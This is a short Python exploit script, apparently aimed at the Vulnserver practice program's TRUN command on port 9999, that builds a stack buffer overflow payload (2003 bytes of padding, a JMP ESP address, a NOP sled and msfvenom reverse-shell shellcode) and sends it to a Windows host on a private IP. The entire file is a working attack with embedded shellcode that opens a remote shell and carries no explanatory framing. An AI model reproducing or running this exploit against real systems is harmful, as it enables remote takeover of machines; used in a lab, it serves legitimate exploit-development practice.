#!/usr/bin/python3

import socket

ip = "192.168.0.101"  # Target Windows IP
port = 9999

offset = 2003
jmp_esp = b"\xaf\x11\x50\x62"  # 0x625011AF in little-endian
nop_sled = b"\x90" * 16

# Your msfvenom shellcode (reverse shell)
shellcode =  b""
shellcode += b"\xb8\x95\x9d\x85\xed\xd9\xc2\xd9\x74\x24\xf4\x5a"
shellcode += b"\x29\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x57"
shellcode += b"\x99\x67\x18\xab\x4a\xe5\xe3\x53\x8b\x8a\x6a\xb6"
shellcode += b"\xba\x8a\x09\xb3\xed\x3a\x59\x91\x01\xb0\x0f\x01"
shellcode += b"\x91\xb4\x87\x26\x12\x72\xfe\x09\xa3\x2f\xc2\x08"
shellcode += b"\x27\x32\x17\xea\x16\xfd\x6a\xeb\x5f\xe0\x87\xb9"
shellcode += b"\x08\x6e\x35\x2d\x3c\x3a\x86\xc6\x0e\xaa\x8e\x3b"
shellcode += b"\xc6\xcd\xbf\xea\x5c\x94\x1f\x0d\xb0\xac\x29\x15"
shellcode += b"\xd5\x89\xe0\xae\x2d\x65\xf3\x66\x7c\x86\x58\x47"
shellcode += b"\xb0\x75\xa0\x80\x77\x66\xd7\xf8\x8b\x1b\xe0\x3f"
shellcode += b"\xf1\xc7\x65\xdb\x51\x83\xde\x07\x63\x40\xb8\xcc"
shellcode += b"\x6f\x2d\xce\x8a\x73\xb0\x03\xa1\x88\x39\xa2\x65"
shellcode += b"\x19\x79\x81\xa1\x41\xd9\xa8\xf0\x2f\x8c\xd5\xe2"
shellcode += b"\x8f\x71\x70\x69\x3d\x65\x09\x30\x2a\x4a\x20\xca"
shellcode += b"\xaa\xc4\x33\xb9\x98\x4b\xe8\x55\x91\x04\x36\xa2"
shellcode += b"\xd6\x3e\x8e\x3c\x29\xc1\xef\x15\xee\x95\xbf\x0d"
shellcode += b"\xc7\x95\x2b\xcd\xe8\x43\xfb\x9d\x46\x3c\xbc\x4d"
shellcode += b"\x27\xec\x54\x87\xa8\xd3\x45\xa8\x62\x7c\xef\x53"
shellcode += b"\xe5\x43\x58\x5b\x92\x2b\x9b\x5b\x4d\xf0\x12\xbd"
shellcode += b"\x07\x18\x73\x16\xb0\x81\xde\xec\x21\x4d\xf5\x89"
shellcode += b"\x62\xc5\xfa\x6e\x2c\x2e\x76\x7c\xd9\xde\xcd\xde"
shellcode += b"\x4c\xe0\xfb\x76\x12\x73\x60\x86\x5d\x68\x3f\xd1"
shellcode += b"\x0a\x5e\x36\xb7\xa6\xf9\xe0\xa5\x3a\x9f\xcb\x6d"
shellcode += b"\xe1\x5c\xd5\x6c\x64\xd8\xf1\x7e\xb0\xe1\xbd\x2a"
shellcode += b"\x6c\xb4\x6b\x84\xca\x6e\xda\x7e\x85\xdd\xb4\x16"
shellcode += b"\x50\x2e\x07\x60\x5d\x7b\xf1\x8c\xec\xd2\x44\xb3"
shellcode += b"\xc1\xb2\x40\xcc\x3f\x23\xae\x07\x84\x43\x4d\x8d"
shellcode += b"\xf1\xeb\xc8\x44\xb8\x71\xeb\xb3\xff\x8f\x68\x31"
shellcode += b"\x80\x6b\x70\x30\x85\x30\x36\xa9\xf7\x29\xd3\xcd"
shellcode += b"\xa4\x4a\xf6"

payload = b"A" * offset + jmp_esp + nop_sled + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"TRUN /.:/" + payload)
    s.close()
    print(f"[+] Exploit sent successfully! Payload size: {len(payload)}")
except:
    print("[-] Failed to connect to the target")
